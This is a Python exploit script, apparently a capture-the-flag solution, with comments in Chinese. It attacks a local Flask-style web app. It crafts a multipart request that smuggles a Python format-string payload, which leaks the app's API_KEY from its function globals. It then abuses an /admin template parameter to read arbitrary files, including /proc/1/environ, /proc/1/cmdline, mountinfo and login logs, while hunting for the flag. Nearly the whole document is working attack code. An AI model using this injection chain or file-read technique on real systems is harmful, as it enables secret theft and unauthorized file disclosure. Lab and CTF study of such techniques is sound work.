import httpx

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=30.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 检查 /proc/1/cmdline - run.sh 的启动命令
    print("\n[*] Checking /proc/1/cmdline...")
    content, code = read_file_via_admin(api_key, "/proc/1/cmdline")
    print(f"cmdline: {repr(content)}")
    
    # 检查环境变量中是否有残留（应该被 unset 了）
    print("\n[*] Checking /proc/1/environ...")
    content, code = read_file_via_admin(api_key, "/proc/1/environ")
    # 查找 FLAG
    if 'FLAG' in content or 'flag' in content.lower():
        print(f"[!] Found FLAG in environ!")
    print(f"environ: {content[:500]}...")
    
    # 检查 /proc/self/stat 是否有有用信息
    print("\n[*] Checking /proc/self/stat...")
    content, code = read_file_via_admin(api_key, "/proc/self/stat")
    print(f"stat: {content[:200]}")
    
    # 重要：检查 /proc/self/mountinfo
    print("\n[*] Checking /proc/self/mountinfo...")
    content, code = read_file_via_admin(api_key, "/proc/self/mountinfo")
    # 查找 flag
    for line in content.split('\n'):
        if 'flag' in line.lower():
            print(line)
    
    # 检查 /sys/kernel/debug（需要 root）
    print("\n[*] Checking /sys/kernel/debug...")
    content, code = read_file_via_admin(api_key, "/sys/kernel/debug/")
    print(f"Status: {code}")
    
    # 关键思路：利用 inotify 或 audit 日志
    # 但这些通常需要特权
    
    # 尝试读取 /var/log/
    print("\n[*] Checking /var/log/...")
    logs = ["/var/log/wtmp", "/var/log/btmp", "/var/log/lastlog"]
    for log in logs:
        content, code = read_file_via_admin(api_key, log)
        print(f"{log}: {code}")
